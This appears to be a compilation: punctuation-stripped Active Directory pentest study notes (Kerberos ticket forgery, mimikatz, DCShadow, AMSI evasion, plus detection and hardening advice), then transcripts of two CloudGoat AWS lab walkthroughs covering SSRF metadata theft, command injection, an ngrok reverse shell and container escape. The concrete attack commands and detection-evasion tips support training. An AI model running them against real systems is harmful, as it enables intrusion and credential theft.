InvisiShell bypasses system-wide transcription PowerShell AMSI and script-block logging - use RunWithRegistryNonAdmin bat instead of RunWithPathAsAdmin bat - modifies HKCU which is less detected than HKLM - RunWithPathAsAdmin bat modifies HKLM - heavy detection on HKLM-based keys - run exit command when you are done to clean up AV Signature Bypass - use AMSITrigger https github com RythmStick AMSITrigger to identify what in your script is triggering AMSI - AmsiTrigger x64 exe -i C PATH TO script ps1 - use DefenderCheck https github com matterpreter DefenderCheck to identify what is triggering Defender - DefenderCheck exe C PATH TO script ps1 - use Invoke-Obfuscation https github com danielbohannon Invoke-Obfuscation for obfuscating scripts - minimize obfuscation and focus more on signature detection modifying detected malicious code string manipulation etc - the more a binary is obfuscated the more suspicious it looks Azure AD Can be integrated with on-prem AD using AD connect using one of the methods 1 Password Hash Sync PHS - all creds of on-prem is hashed and synced with Azure AD 2 Pass-Through Authentication PTA - Azure AD forwards creds to on-prem AD - on-prem checks if cred is valid or not this result is returned to Azure AD and Azure AD either allows user to access Azure resources or not 3 Federation -

the DC is the only exception to this How Kerberos Works Untitled CRTP 20Notes 207c65562269c14f0ba54f9df255f72aa4 Untitled png - Kerberos NTLM uses RC4 encryption https learn microsoft com en-us openspecs windows protocols ms-nlmp 1e846608-4c5f-41f4-8454-1b91af8a755b - DC contains all the credentials in the domain which allows it to decrypt requests made with a user s NTLM hash - in first step user encrypts timestamp with his or her NTLM hash - DC then checks the clock skew between the user s timestamp and the DC timestamp skew should not be more than 5 minutes by default - TGT is encrypted and signed with NTLM hash of krbtgt - krbtgt account made specifically for this purpose - user requests TGS from DC when trying to access some resource e g application server - note the TGS is encrypted with the NTLM hash of the requested service s service account - requested service can decrypt the TGS as the service knows its own NTLM hash - when DC decrypts TGT the only validation it performs is whether or not it can decrypt the TGT and does not validate the decrypted contents - optional mutual authentication can occur to ensure client doesn t send TGS to rogue app - optional PAC requests are not enabled by default to avoid bogging down the DC with requests - Kerberos policy checked only when TGT is created - user account validated by DC when TGT age is greater than 20 minutes User Fields - get user s description fields sometimes contain passwords in cleartext powershell Get-ADUser -Filter Description -like built -Properties Description select name Description Identities Command Description --- --- Get-ADComputer -Filter Returns computers connected to current domain Get-ADGroup -Filter Returns all groups in current domain Get-ADGroupMember -Identity GROUP NAME -Recursive Returns users part of specified group Get-ADPrincipalGroupMembership -Identity USER See groups user is a member of Get-DomainGroup -Username 0xd4y Find which group 0xd4y is a part of Invoke-ACLScanner -ResolveGUIDs IdentityReferenceName -match GROUP NAME OR USER NAME Find permissions identity has for users in domain -

in the case when the trust is between two different forests the last part of the SID is stripped as long as it is between 500 to 1000 - any ticket that crosses forest trust boundary will therefore not be privileged - this means it is not possible to escalate to EA across forest trusts by abusing SIDHistory Trust Tickets - when compromising a domain you can craft golden tickets destined for other domains within the forest - no effective defense against this works as intended - a compromise of one DC in a forest is enough to assume that the forest is fully compromised - note that managed service accounts end with a dollar sign -

note the domain a k a intra-realm trust key is rotated every 30 days automatically and can also be rotated manually - this is unlike inter-forest a k a inter-realm trust keys which do not automatically rotate - no need to have DA privileges to forge a TGT - only need DA privileges to get the hash used for forging a TGT - therefore it is enough to compromise one domain in a forest to compromise the entire forest - note that for the sids parameter it is more stealthy to use the domain controllers group S-1-5-21- -516 and the enterprise domain controllers group S-1-5-9 as it avoids some logs - looks like sids S-1-5-21-1004336348-1187298915-682003330-516 S-1-5-9 - when running remote command on forest root a 4624 and 4634 will occur which is normal but a 4672 Admin Logon event will be triggered as well which is an anomaly - more opsec safe to use the child DC user to access the forest root DC rather than using a DA - it s normal for two DCs to sync to each other AD Certificate Service CS - server role allowing for building a public key infrastructure PKI and public key cryptography digital certificates and digital signature capabilities -

note that a golden ticket is a TGT while silver ticket is a TGS - always ask the client before performing persistence - especially for the Skeleton Key DSRM and CustomSSP methods which downgrade the target organization s security Golden Ticket DC does not validate contents of decrypted TGT - with hash of krbtgt account you can forge a TGT and access any resources - can impersonate any user - if the krbtgt password is changed manually doesn t matter how complex it is it will be automatically updated to a complex password instead -

renewmax 10080 sets ticket renewal lifetime to 7 days which is 10 080 hours default AD setting - even if a sysadmin changes the krbtgt password a golden ticket will still work as krbtgt remembers the previous password - golden ticket attack does not need special local or domain privileges - can be run from non-domain joined machine - ensure you also specify the sids ENTERPRISE DC GROUP parameter to decrease chances of detection by MDI - better to just use diamond ticket which has better chances of bypass Silver Ticket - forged TGS when accessing service - requires NTLM hash of service account - allows you to impersonate any user when accessing service - unless using silver ticket against DC this silver ticket does not trigger a 4672 Admin Logon event - silver ticket fails if PAC check is made not enabled by default - PAC stands for Privileged Attribute Certificate -

like golden ticket but more opsec safe - silver ticket is a lot more opsec safe than both - instead of crafting a TGT you request a TGT from the DC decrypt the TGT and make modifications and then send back that TGT to the DC -

whatever access the compromised domain admin has in the target forest those will be the permissions you have in that forest - therefore you could be a domain admin in one forest but a normal domain user in a different forest - use Invoke-Mimikatz -Command lsadump lsa patch or Invoke-Mimikatz -Command lsadump trust patch to get the trust key for the inter-forest trust - inter-forest trust keys do not automatically rotate unlike intra-forest domain trust keys MSSQL - good for lateral movement - domain users can be mapped to database roles - database links work across forest trusts - if you have a database that is linked to another database you can potentially run commands on that remote SQL server and laterally move Get-SQLServerLinkCrawl -Instance example-mssql -Query exec master xp cmdshell whoami -QueryTarget target-mssql -

registers a new domain controller - used to push attributes SIDHistory SPN etc specific objects without leaving logs for modified object no 4662 event or any other change log event created - this is because attribute changes from a domain controller does not create change logs - requires DA privileges and attacker must own forest root domain Methodology Within Mimikatz perform the following powershell Start RPC servers with SYSTEM privileges and modify attribute in this example we ll edit the description of the 0xd4y user processtoken lsadump dcshadow object 0xd4y attribute Description value Subscribe to 0xd4y on YouTube Push the changes lsadump dcshadow push - you may need to first impersonate a DA with sekurlsa pth user Administrator domain 0xd4y notes local ntlm DA HASH impersonate - to push the changes you will need to run another mimikatz instance Privilege Movement Lateral Movement Command Description --- --- Find-LocalAdminAccess Returns machines in current domain where current user has local admin access Enter-PSSession -ComputerName HOSTNAME Log into other computer remotely works if you have local admin access on destination computer Invoke-Command -ComputerName HOSTNAME -ScriptBlock COMMAND Runs command on remote machine s Use FilePath instead of ScriptBlock to execute a file Invoke-Mimikatz -ComputerName comp1 comp2 Can be used to extract creds and write to LSASS using Invoke-Command and PS remoting winrs -r follow-0xd4y whoami Run whoami command on follow-0xd4y computer using WINRM - Find-LocalAdminAccess is very noisy - first runs Get-NetComputer and then uses Invoke-CheckLocalAdminAccess on each machine - if Enter-PSSession does not work you may need to run Enable-PSRemoting - PS remoting uses port 5985 http while 5986 uses SSL - note only the transport tunnel is in cleartext but the traffic inside that tunnel is encrypted - note that Invoke-Mimikatz is better to use than mimikatz exe as it does not require you to write to disc - you can run this remotely within a session Invoke-Command -ScriptBlock function Invoke-Mimikatz -Session session - use Invoke-Mimikatz -Command sekurlsa pth user Administrator domain follow-dc ntlm NTLMHASH run powershell exe to generate tokens from hashes writing to LSASS - this is an overpass-the-hash attack - creates a ticket using NTLM hash of user - the winrs command works on a remote computer if you have admin privileges on it Interacting with Script Inside Session powershell session New-PSSession -ComputerName HOSTNAME Invoke-Command -FilePath PATH TO PS1 SCRIPT -Session session Enter-PSSession -Session session Invoke-Command Invoke-Mimikatz Tips - note the password of service accounts are in cleartext when running mimikatz because their passwords are stored in LSA secrets - stored in HKEY LOCAL MACHINE Security Policy Secrets - password in cleartext because this is needed for the service to log in as the service account - you can run commands from local memory when targeting remote computers powershell Invoke-Command -ScriptBlock Invoke-Mimikatz -Session session - this runs the Invoke-Mimikatz cmdlet from one s local PS session and executes it on the remote machine - with the hash of a user you can start a session using a pass-the-hash attack make sure you run this with local admin rights powershell Invoke-Mimikatz -Command sekurlsa pth user 0xd4y domain follow 0xd4y notes local ntlm NTLM HASH run powershell exe - after running this whoami will not show that you are the impersonated user but you are and have the permissions of that user Another Method for Running Mimikatz on Remote Machine 1 session New-PSSession -ComputerName follow-dc 0xd4y notes local 2 Invoke-Command -Session session -FilePath PATH TO PS1 FILE 3 Enter-PSSession -Session session 4 Invoke-Mimikatz -Command lsadump lsa patch - you can also extract the krbtgt hash by using DCSync Invoke-Mimikatz -Command lsadump dcsync user vuln corp krbtgt - this avoids running Mimikatz on the remote machine Local Privilege Escalation Common Misconfigurations - missing patches - passwords in clear text - AlwaysInstallElevated turned on see https 0xd4y com reports Love Writeup pdf https 0xd4y com reports Love 20Writeup pdf for how to exploit - misconfigured services unquoted service path permission of service is misconfigured overwrite exe binary etc - Get-ServiceUnquoted - Get-ModifiableServiceFile - Get-ModifiableService - Get-WMIObject Win32 service select Name PathName - Invoke-ServiceAbuse - abuse discovered misconfigured service - Use the following as it is the least noisy though still noisy Invoke-ServiceAbuse -Name VULNERABLE SERVICE -Command COMMAND - Invoke-AllChecks - scan for common misconfigurations that can result in privesc - DLL hijacking - AutoLogon enabled password stored in clear text or easily decryptable found in registry Checks - PowerUp Invoke-AllChecks - in the case of an unquoted service check if CanRestart is True and it is being run with higher privileges than your current user StartName - otherwise need to wait for server to reboot or other user to restart it - service is not vulnerable if you need to drop a binary in the root C Admin privs needed for that - BeRoot beRoot exe - Privesc Invoke-PrivEsc Defense In incident response scenarios run Enter-PSSession -ComputerName TARGET COMPUTER -Credential CLIENT DOMAIN Administrator and type mimikatz as the password If it works then this is indicative of skeleton key persistence - find specific log ID with Get-WinEvent -FilterHashtable Logname Security ID EVENT ID -MaxEvents NUMBER OF EVENTS Format-List -Property Advanced Threat Analytics ATA - useful for detecting recon compromised credential attacks and cred hash ticket replay attacks - can detect behavior anomalies - traffic to DCs is collected by the ATA and an activity profile is built over time Monitoring Traffic - looks for spikes in network traffic - look for 4624 Account Logon and 4634 Account Logoff event IDs - caused by the Find-LocalAdminAccess cmdlet - monitor changes to HKLM System CurrentControlSet Services DNS Parameters look for DNS stops and starts and monitor event 770 which shows the location from which the DLL was loaded - helps monitor potential DNSAdmins attacks - 4672 on any machine other than the DC should be tracked - DA permissions should not be used on any other machine in a properly configured AD environment Kerberoast - one of the most silent attacks - triggers 4769 Kerberos ticket was requested looks normal - use secure service account passwords 25 characters - use managed service account - uses password rotation and delegated SPN management - monitor 4769 with the following filter - service name krbtgt or does not end with - account name not from machine domain filters requests from machines - failure code is 0x0 only shows success transactions where user received a TGS - ticket encryption type is 0x17 - AES is 0x12 while MD5 HMAC is 0x17 - can obtain TGS with Invoke-Mimikatz -Command kerberos list export or with Impacket s GetUserSPNs script ACL Attacks Logs for this attack not enabled by default otherwise the following events are triggered - triggers events 4662 An operation was performed on an object 5136 A directory service object was modified and 4670 Permissions on an object were changed Stopping Enumeration Techniques - use NetCease ps1 on server to prevent users from running Get-NetSession on that server - stops Invoke-UserHunter attacks - NetCease ps1 can break things be careful before using Stopping Golden Ticket - change krbtgt password account twice krbtgt remembers the previous password - ensure that you do not change the password twice within 10 hours as this will invalidate all the tickets already distributed default AD ticket lifetime is 10 hours - triggers 4624 Account Logon 4634 Account Logoff and 4672 Admin Logon Mitigating Skeleton Key Run LSASS as protected process - requires mimikatz driver mimidriv sys to run on target s disk - removal of this protection would be very noisy - looks like a service installation in the logs - may break some drivers and plugins - skeleton key creates events 7045 service installed on system - Kernel Mode Driver 4673 Sensitive Privilege Use and 4611 trusted logon process registered with Local Security Authority Password Solutions Local Administrator Password Solution LAPS - used to solve the problem of have a local admin on multiple workstations with the same password - centralized password storage - computer objects have two new attributes ms-mcsAdmPwd stores pass in cleartext and ms-mcsAdmPwdExpirationTime stores password expiration time - although storage is in cleartext transmission is encrypted Credentials Guard - available only on Windows 10 or later and Windows Server 2016 or later - protects LSASS by isolating it using virtualization - only allows privileged system software to access it - restricts access to NTLM hashes and TGTs - effective in stopping PtH and Over-PtH attacks - makes it hard to read and write to LSASS - note LSA secrets and SAM are still not protected - cannot be enabled on DCs breaks authentication Deception Tricking threat actors into going down pathways that would trigger alerts and waste their time - create some users with interesting properties that have easy-to-find exploits - intentionally create some kerberoastable service accounts - you can also create a group where upon reading the group DACL discretionary access control list it triggers a 4662 event - decoy users can be created with Create-DecoyUser Detecting Other Persistence Methods DSRM Malicious SSP - creates 4657 event ID Audit creation change of HKLM System CurrentControlSet Control Lsa DsrmAdminLogonBehavior SecurityPackages Hardening PowerShell - disable PowerShell if nothing is using it in your organization - if this is possible ensure System Management Automation dll is blocked otherwise it is possible to load PowerShell functionality with NET code - this is because PowerShell is not powershell exe it is System Management Automation dll the PS console is just a host for the DLL - do not install PowerShell 6 0 0 PowerShell Core instead install PowerShell 5 1 many security features not supported on 6 0 0 - use AppLocker and Device Guard to restrict PowerShell scripts - check AppLocker policy Get-AppLockerPolicy -Effective select -ExpandProperty RuleCollections - use WDAC whenever possible - better than AppLocker as it is effective even against local admins - AppLocker can by disabled as an admin - use ConstrainedLanguage mode - can be found with ExecutionContext SessionState LanguageMode - can only run built in cmdlets - cannot load NET classes type accelerators arbitrary C code via add-type prohibits complex scripts etc Logging Note that the warning level for the log checks only work against a known list of potentially malicious commands You can either enable logging via the registry or via group policies - enable console logging for everything that uses the PowerShell engine powershell exe PowerShell ISE NET DLL msbuild installutil etc and forward logs to a log system - can be found under Administrative Templates Windows Components Windows PowerShell Turn on PowerShell Transcription - optionally set EnableTranscripting to 1 under HKLM Software Policies Microsoft Windows PowerShell Transcription - enable script block logging under Administrative Templates Windows Components Windows PowerShell Turn on PowerShell and or set EnableScriptBlockLogging to 1 under HKLM Software Policies Microsoft Windows PowerShell ScriptBlockLogging - you should also enable logging for modules under Administrative Templates Windows Components Windows PowerShell Turn on Module Logging and or set EnableModuleLogging to 1 under HKLM SOFTWARE Wow6432Node Policies Microsoft Windows PowerShell ModuleLogging - also set the registry key to for enabling it on all modules - results in a large number of logs - turn on System-wide transcription to log ALL PowerShell commands however the logs are not protected - if password is entered in PowerShell it shows in plaintext in the logs Bypassing PowerShell Defenses - PowerShell downgrade - version 2 does not support the aforementioned detection mechanisms - logged under event 400 Engine state is changed from None to Available look for EngineVersion - you can also potentially use PowerShell 6 0 0 Untitled CRTP 20Notes 207c65562269c14f0ba54f9df255f72aa4 Untitled 2018 png - modifying modules in memory - check Applocker policy it may be possible to run some scripts in specified directories -

logged under event 4104 if caught by AMSI remember to obfuscate Other Best Practices - NEVER run services as a Domain Admin - avoid using unconstrained delegation and constrained delegation - do not allow DAs to log into machines other than the DCs - if it is necessary to log into other machines limit the machine to only allow administrator logins from DAs - this makes credential theft unlikely - never run a service as a DA - if needed to provide temporary permissions to some entity or vendor use the following command Add-ADGroupMember -Identity GROUP NAME -Members new user example -MemberTimeToLive New-TimeSpan -Minutes OF MINUTES - set Account is sensitive and cannot be delegated for sensitive accounts - found within the Account tab in the user s properties - if running legacy software that cannot be updated ensure the app is restricted to certain users or groups - run agent on application and use Azure Application Proxy https learn microsoft com en-us azure active-directory app-proxy application-proxy which will block access from everyone until they input their AD credentials - add sensitive users to the Protected Users Group Protected Users Group - Protected Users Group ensures the following - CredSSP and WDigest to stop cleartext credential caching and NTLM hash is not cached - no NTLM authentication - no delegation - TGT cannot be renewed beyond four hours this is hardcoded and is unconfigurable - test the potential impact of an account lockout for DA and EAs before adding to this group - computer and service accounts would not benefit from this group because their credentials will still be present on the host machine Tools 1 BloodHound https github com BloodHoundAD BloodHound - useful for enumeration in penetration tests finding exploitation pathways 2 PowerSploit https github com PowerShellMafia PowerSploit -

      "content"  : "hello everybody this is zero day and this is the rce web app scenario in the cloud goat series unlike with other scenarios this scenario starts off with two users because there s two different ways to escalate your privileges within the environment with one user you can simply query an S3 bucket that contains a private SSH key and you can just use that SSH key to SSH into an ec2 instance and that ec2 instance contains a high privileged role that once you get the credentials for you can then query a different S3 bucket to obtain the credentials for an RDS instance then you just log into that RDS instance and you can get the secret values that are stored within the instance the other user has the permission to query an S3 bucket that contains logs for an elastic load balancer and this log contains a URL that you would otherwise not be able to find so you just are able to query that that from discovering it within the logs and then you get rce onto the ec2 instance and from that stage onwards everything is the same so let s jump right into it we were provided with two users this time Lara and McDuck so let s put their credentials in the AWS credentials file with AWS configure profile Lara and we could put in the axis key and secret key so let s put an access key secret key and same thing with McDuck McDuck access key secret key and a thing I like starting out with uh with this AWS c-line tool is just making sure that I first set my engagement with AWS C lion dash dash set Dash engagement and then name it let s name it rce web app and what this will do is that any command that I run any AWS API call gets recorded in this directory so let s uh just do AWS STS get Dash caller Dash identity now this is an API call that I like running when stealthiness is not a problem so let s do profile Lara just to make sure that we put the correct access key in secret key that we copied it correctly and we did for Lara and McDuck everything looks good so now we can just continue our pen test so let s start off with McDuck uh let s just run a couple of commands so he is an IAM user let s then do maybe a list of roles see if he can do something like that as McDuck not allowed to do that uh can we list the policies can t so let s try ec2 describe instances profile McDuck and specify the region of us-east-1 and we can do that so we have an ec2 instance here uh with let s see this iPad address and we see um this is the key pair and what else anything else of interest there is the security group here so we can assume that SSH is open and HTTP as well so let s just test that out really quick let s try SSH this IP address and we see that it is open it only allows Keys which is very common with ec2 instances um now let s try the http and curl is not returning anything and that s because the security group probably does not allow our IP address to query this uh HTTP application so let s move on with some other services uh how about Lambda list functions profile McDuck and region of us-east-1 and that does not work uh how about S3 profile McDuck and that does uh so there s hundreds of services that AWS offers and just manually inputting that is not only Annoying It s very very tedious so there is a tool called enumerate IAM and what this will do is that just a brute force your potent potential API calls that you can run if it doesn t return an axis denied exception if it does not return this axis denied exception then it is assumed that you can run that command so when we run this we need the access key and the secret key solet s put the access key of McDuck and his secret key Dash the secret key and put that in and let s also specify that we are only interested in us East one and that will just continue brute forcing so while that does its magic we will look at these S3 buckets and see what we can look at so S3 let s do this key store so we see that there we have what looks like it s probably a private key an SSH private key and its Associated public key so we could potentially use this to SSH into this ec2 instance but before doing that let s look at the other S3 buckets so we also have this Cloud goat logs bucket see if we can enumerate that we cannot and how about this Cloud goat secret bucket and we can t do that so let s just take that the the private key from this S3 bucket and let s copy it and put it in our current directory so we have now downloaded this file so let s now SSH into that ec2 instance so SSH I Cloud go and let s assume that it s a nubuntu instance and put in our our IP address for that ec2 instance which was right here SSH and change mod to this file and now let s try again and it was an Ubuntu instance and now we re in uh I mean if you did an nmap scan you could also know that it s Ubuntu if Ubuntu didn t work then you could also do ec2- user which is also very common but anyways now that we are in this instance uh we can curl our iPad I mean our metadata with curl169 254 get the latest endpoint and then uh get the role that s attached to this instance so we see that there s this IAM endpoint which only exists if a role is attached to this instance so we have IAM and security Dash credentials and finally we will have this role here ec2 role rce web app so we can take this and then we get the access key secret key and token for this role and we can take this and put it in our own profile and we can take this and just do AWS configure dash dash profile ec2 and this wouldn t be a problem because we re not worried about stealthiness but because we already have access to this instance we might as well just run API calls from within this instance and also considering that there are some security groups involved in this entire environment maybe this ec2 instance can query a certain IP address but my home IP address cannot due to security groups so we will just stick with this ec2 instance and let s see does it have AWS so let s let s install it install and while this runs let s look at the output of our enumerate IAM tool so we see that we can describe uh instances for RDS so let s just do that really quick while the AWS installs so AWS RDS describe DB instances for a profile of McDuck and region of us-east-1 and we see that there is one um we don t know the credentials but we do know the username is CG admin and the it s using postgres um so this does have a security group and it s possible that it s that using our home IP address we re not allowed to connect to this RDS instance but we can connect to it through our ec2 instance and that s very common as well when you re running an application within an ec2 instance that you wouldn t want just anybody to access an RDS instance you would only want your ec2 instance to use it because that s the only thing that needs to use it so we see that that might be the case here and we can verify that later once this is done installing so it didn t in fact the finish so let s do AWS RDS describe db- instances to see if it can do that it likely does have RDS permissions so AWS artists described as DB instances region of us-east-1 and it can uh it s the same instance so we if you recall there was this S3 bucket that we were not able to enumerate called Cloud goat logs and Cloud go secret so let s see if we can do that with this instance so s3ls and I m used to it in putting a profile but we don t need to do that now so these were the buckets so let s do the bucket that we couldn t query so Cloud goat logs and we see that we can do that here and how about Cloud go Secret Cloud go secret and we can we have db txt so let s check what that is so copy which we re just downloading it copy slash db txt into our current directory so now let s cut this and we see that we have credentials in plain text we have this username of CG admin which if you remember from our RDS output that is the same username here and we have the password of purple pony 2029 so let s connect to this uh postgres RDS instance so P SQL Dash H let s put in our address in 5432 by the way is the default Port so we don t need to specify that Dash H and let s put the username of CG admin and the DB name Cloud go Dash D Cloud go and it is taking a while and that is probably because of the security groups in place so let s copy this same command and do it within the ec2 instance and we see that we can so let s put in the password of purplepony 2029 and we are now inside of the RDS instance so let s do slash DT to list the tables and we see sensitive information this is a table of cloud code admin so let s select everything from the sensitive information table and we see that the super secret password is Victory and all of these characters so that was the pathway for McDuck on how to compromise at least the RDS instance which was the goal for this scenario so now let s switch over to Lara so as the Lara user let s see if we can also list the buckets so AWS s3ls profile Lara and we can do that as well uh so we could do the key store we can enumerate that as the McDuck user uh we can enumerate secret as the ec2 profile but not as McDuck so let s see if we can just jump and do that as the Lara user AWS is 3ls and axis denied as expected uh so let s check out these logs let s see if we can do that accidentally executed the same command but as you can see with sea lion this API call did not get recorded by cloudtrail because this was run straight from memory AWS client recognizes when you run a command that was already ran and so it only reads the output from memory without passing the API call to the AWS account that you re targeting so anyways let s uh just continue with enumerating this S3 bucket and we see that we can do that so let s copy these Cloud go load balancer logs so there is a load balancer within this environment so let s just copy the logs here so dash dash recursive copy it all in the current directory and we downloaded the files we see we have these load balancer logs AWS logs and there is this elastic load balancer access log test file nothing interesting we see there s probably an application involved it s an application load balancer most likely um so let s go into elastic load balancing there was another file right here and let s check this out so we have um it querying where the get requests to this site um a bunch of those here so let s curl this and see what happens curl this cannot resolve host so let s list the elastic load balancers within this environment so we could do that with AWS elb V2 that s just the newer version if we look at the difference between version 2 and the regular version is that if we do AWS elb help we see that it can it supports three types of load balancers application Network and classic while elbv2 supports application Network Gateway and classic so it s just a newer version we might we may as well use it so AWS elb V2 and we want to describe the load balancers in our environment again if you re ever unsure on which commands you can run within a certain service you could just do the service name and then do help and you will see all the different commands that you can run within that service so let s describe the load balancers here with the profile of Lara and the region of us-east-1 and we see that we can do that we have this DNS name it is in fact an application load balancer um and seems that is about it so let s just go to this DNS name and I ll go to Brave paste that in and we see gold star executive Interstellar travel rewards welcome fellow Travelers uh please visit the secret URL which is included in the instructions in the welcome letter you received so we do have access to the logs so let s see if a secret agent did in fact query the secret URL so we can find that here where is where are the logs less 555 so if we look at all the get requests here um we have fave icons this is just the logo of the site we do have this very strange a secret looking URL so let s copy this paste it in um it says the site cannot be reached if we paste that HTML part to the end of this let s see MK copy and we paste it at the end here and we see that we are in fact redirected to the secret URL this secret page please follow the instructions in the welcome letter you received by post and do not enter any other commands run your personalized login command below so who am I let s run that run signup command and we see that we are root if we do LS this is all the contents in this current directory I m actually curious what file is before we try getting a shell on here catfile txt okay so just an IP address so then let s try getting a shell on this system and so there are many different ways you could try getting a reverse Shell through NG Rock um you can try we did see that there s SSH so we can just try putting an SSH file with in the Ubuntu user so if we look at slash home slash Ubuntu we see that there is an SSH directory so LS slash home Ubuntu dot SSH and there s this authorized Keys file so let s create our own SSH file and then save our public key within this authorized Keys file so let s go here ssh- Keygen and the reason I m going to use ed25519 is because this is a very small private key in public key and this will allow us to Echo the output of our public key to this authorized Keys file otherwise you may run into some truncation issues so let s do this let s call it ID RSA and we see this is our private key uh quite small and even smaller is our public key and this end part we can just leave out so let s just Echo this into the authorized Keys file so Echo Echo this into slash home Ubuntu SSH authorized underscore keys and it looks fine so now let s SSH using this file as Ubuntu at and what was the let s go into our AWC line director to see what was the IP address of that ec2 instance so if you do find dot grep IP address or was it or grep Dash rip address I mean um it was this this AWS C line tool just saves all your commands so you can just go into Lara you see that she did elb V2 S3 and STS and you look at McDuck and you see IAM RDS you could just go into any one of these directories and see the txt file anyways uh let s put this ec2 instance in here and we are now inside of the ec2 instance and basically the way to go from here to the RDS instance is the same same thing you get the credentials from the db txt file everything is just the same from here on so anyways thank you for watching and I ll see you in the next video",

      "content"  : "hello everybody this is your day and this is the ECS takeover scenario in the cloud goat series the scenario starts off with just a public DNS name exposed to us it s just a website hosted on a privileged container so when we find that there is an rce vulnerability in the site we can then gain a reverse shell and then once we are inside of the container we can escape out of it because it s privileged in the scenario there s actually two different ec2 instances in the environment and the ec2 instance that we did not compromise contains a container called Vault so all we have to do is just update that task we just drain it and the task gets migrated over to our ec2 instance where we can then execute commands within that container and gain the sensitive files of that container so let s check it out we were provided the public DNS name of the target but before browsing over to that let s configure our c-line engagement so we could do that with set Dash engagement and then put in our engagement name of ECS takeover so now let s go and navigate to this with our web browser here and we ll go put this in here and now we have this website cloner so we have this cloner clone URL header here and this URL form so I suppose it s looking for some sort of URL that we need to input Let s uh input uh my website 0xd4y com and we see the HTML of the website uh what if we try like some sort of ssrf like 169 254 169 254 and that works so we do have an ssrf vulnerability here so we can get the metadata just like this do IAM security Dash credentials and here we have the role associated with this instance so let s get this roll here do slash input this role and now we have the access key the secret key and the token so let s start configuring this so AWS configure profile let s call it ec2 we have this little warning here given by the AWS C line tool it detects that we are running a pen testing distro when we run an API call in AWS it logs our user agent and our user agent contains our parrot OS so that will trigger guard Duty so before doing anything even though AWS configure is not an API call to this account we can just configure our set our user agent really quick by setting it so let s put in our engagement and I guess let s do this default engagement user agent here so now let s configure our profile let s put in the access key and the secret access key and let s also put in the token so AWS session token equals all of this and yeah it s gonna be really really long here so let s just keep on copying and being be patient it s a very long line here all right copy put all of that in and let s hope that it was all copied correctly so AWS STS get Dash Color dash identity and just so you know when we re going to be running this we re going to be triggering guard Duty with a credential exfiltration finding but we won t worry too much about being stealthy for this scenario there s a lot to go over in the scenario so it does work we did correctly put in the credentials let s see if we can do anything what if can we describe the instances with this profile ec2 and let s put in our region of us-east-1 and we can t even do that so what about S3 profile of ec2 and we get an access denied error so it s very likely that the role is just not that highly privileged we don t know too much about this role yet I doubt it has any IAM permissions but if we play around with this application a little bit more we see this URL here per this parameter maybe there was some sort of remote code execution that we can do so let s do some tests let s see what happens here failed to clone website but if we do test semicolon who am I we see that we do have code execution as it outputs root so let s go and try to get a reverse shell so a while back I actually created a tool called rev shell it s a tool that allows you to get a reverse shell just by using your own terminal I ll put a link to that in the description below it s like the default first tool that any penetration tester does so let s let s put in our our Port but actually before we know which Port we want in order to get this reverse shell we will need a public IP address and we can do that with NG rock or ngrok so we re going to do ngrok TCP 4444 and just enter that here and so we can see that what will happen is any request made to this 4 tcp nguk io on this port gets forwarded to our localhost 4444 so we want to put our Port as 16495 because that s what s shown right here and we want to put our IP as 4 TCP ngrok io and now let s enter that it says please specify valid IP address or interface when I was creating this tool I had ctfs in mind where you re connected to some sort of VPN so let s just do Force to ensure that anything is allowed so this is the payload that we re going to be using let s do Dash C so it s copied to our clipboard and now let s put that in here test and paste that in and before we run that let s spin up a listener here on Port 4444 so basically what s going to happen and we see it hanging so it s a good sign and here s the reverse shell basically what happened is the payload got sent to this location and this got forwarded to our 444 Port which is how we caught the reverse cell here let s see how that worked so let s go to main go which is where the website s code is and we can see here just loading up the application but over here is the really interesting part it clones the website by executing the command bin sh Dash C curl and then whatever the user inputs so it was easy for us to just put a semicolon and then some sort of command and then just like that we get remote code execution so let s go back to our reverse shell here and as you can see we re root let s do LS so it says Docker file are we within a docker container and we are we d see dot Docker end so let s do Docker PS to see what other Docker containers there are and to see if the host Docker socket is mounted onto this container and it actually is as we can see here we have the volume site uh container ID this is our own container ID and we can see some other containers here this one s called priv D maybe for privileged and we have the ECS agent which is not that interesting um it s just used to allow container instances to connect to your clusters so it s just kind of a regular agent that you would typically see when running Docker containers uh within the ECS so this real this is really interesting here with the priv D uh let s see if we re perhaps maybe we re in a privileged container our ourselves and maybe that way we can actually Escape out of our container and go into the host instance so there are multiple tools out there that you can see that will just run this for you so we go GitHub uh GitHub and Docker Escape tool there s multiple ones here let s choose this one here and we have this Escape tool so let s copy and we have wgets we do so let s do W get this change mod plus X Docker Dash Escape now when we run this tool we re actually going to be kicked out of our our reverse cell it s not very stable I could just show that here just outputs all of this and then we get kicked out but if we look here we see that there is this check to see determine if the environment is a Docker container but one of the things that it does does not say here in the description but if you write Docker Escape check it will see if you can actually Escape out of your container and if you can it creates its own privileged container and that way you can escape out into and go into the host instance so let s just get our reverse shell back really quickly so let s do let s run this again submit and go back into root so Docker Dash Escape check so it s creating a container and it started the privileged container and now whatever command we run uh we can run on the host so if we do uh nc-lvnp 4444 and let s go back to our rev shell tool let s see if we have uh do we have NC here no NC say probably Bash so we have bash so let s do rev shell Dash T bash and this is what the command actually looks like so let s put this in and now we are into the host so who am I and we go into here and we see ls-l-a and that s it another thing that we could do to see if it was even possible to escape out of the container so if we look here now there s this new container here um this is the privileged container it s named thirsty underscore Lehman uh but if we go here or was it yeah this was the container we just copy that and we do Docker inspect and we put this in we can see a lot of different parameters with this container one of them is this parameter called privileged and we can see that privileged is set to true so the website was running on a container instance was running within a container instance that was privileged and you can escape out of privileged containers so that s exactly what we did here but anyways uh let s check out this other uh container here this privileged one let s see if we can run any commands in it so Docker exec SSH does c who am I uh and I forgot to specify the container ID here so container ID here sh c who am I and we see roots so let s try doing a couple of things let s try getting the metadata for this so a very interesting metadata endpoint within containers ECS containers is they have their own metadata endpoint called 169 254 170 2 so let s try querying that do we have curl we do not do we have wget we do so if we just do W get alone it won t output the result of that of that query unlike curl but there is a flag that we can do Dash o dash and using this it will output everything from wget so wget Dash o dash169 254 170 2 and it says 404 not found and that s because we need to actually specify where the credentials are so that is I believe in V2 metadata I think this is the endpoint uh it might it might be with a dash and if not there is one environment variable that we can do so metadash data is it like this no it s not so I I forgot what that endpoint was but you can do this instead so 170 2 dollar AWS container credentials relative URI and this environment variable just contains the location of that metadata credential endpoint let s see exactly what that is actually so Echo dollar AWS container credentials relative URI and this is actually it so it s V2 credentials and then it is the container ID I believe or actually it s not I guess it s just some random uuid so anyways let s input all of this in so that we can get the credentials for the IAM role attached to this task so let s go AWS configure dash dash profile priv d put in the access key the secret access key and also the token so right here Echo AWS session token equals this put it in our AWS credentials file and now let s do caller 